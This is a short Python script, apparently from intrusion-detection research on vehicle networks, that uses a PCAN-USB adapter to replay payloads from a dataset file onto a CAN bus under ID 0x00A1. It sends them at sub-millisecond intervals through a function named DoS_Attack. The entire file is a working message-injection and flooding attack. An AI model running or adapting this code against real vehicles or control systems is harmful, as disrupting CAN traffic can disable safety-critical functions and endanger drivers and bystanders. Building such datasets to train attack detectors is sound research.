from PCANBasic import *
import random
import time
import datetime
from os import walk

use_id = "00A1"
injection_file = "Dataset/Filtered Datas/" + use_id + ".txt"

def DoS_Attack(id, leng, data):
    all_datas = ""

    DoS_DATA = TPCANMsg()
    DoS_DATA.ID = int(id, 16)
    # DoS_DATA.LEN = len(data)
    DoS_DATA.LEN = 8
    DoS_DATA.MSGTYPE = PCAN_MESSAGE_STANDARD
    
    all_datas += str(DoS_DATA.ID) + "\t" + str(DoS_DATA.LEN) + "\t"
    
    for i in range(leng):
        DoS_DATA.DATA[i] = int(data[i*2:i*2+2], 16)
        all_datas += str(data[i*2:i*2+2]) + "\t"

    print(all_datas)
    CAN.Write(CAN_BUS, DoS_DATA)
    time.sleep(0.0001)

if __name__ == "__main__":
    CAN = PCANBasic()                            #CANi
    CAN_BUS = PCAN_USBBUS6
    counter = 0    
    start_time = time.time()
    ind = 0
    result = CAN.Initialize(CAN_BUS, PCAN_BAUD_500K, 2047, 0, 0) #Channel, Btr, HwType, IOPort, INterrupt
    if result != PCAN_ERROR_OK:
        # An error occurred, get a text describing the error and show it
        #
        print("oh No")
        CAN.GetErrorText(result)
        print(result)
    id_exist = False
    f = open(injection_file, "r")
    lines = f.readlines()
    count = 0
    for line in lines:
        line = line[:-1]
        print(line)
        print(len(line))
        leng = int(len(line)/2)
        DoS_Attack(use_id, leng, line)
        # if count > 5:
        #     break
        # else:
        #     count+=1    